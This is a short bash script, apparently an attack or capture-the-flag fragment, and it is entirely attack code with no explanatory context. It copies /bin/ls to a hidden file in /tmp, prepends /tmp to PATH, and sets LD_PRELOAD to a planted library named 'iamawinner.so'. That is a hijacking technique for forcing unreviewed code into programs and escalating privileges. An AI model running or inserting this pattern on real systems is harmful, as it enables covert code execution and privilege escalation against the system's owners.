#!/bin/bash
cp /bin/ls /tmp/.ls
export PATH="/tmp:$PATH"
export LD_PRELOAD="/tmp/iamawinner.so"
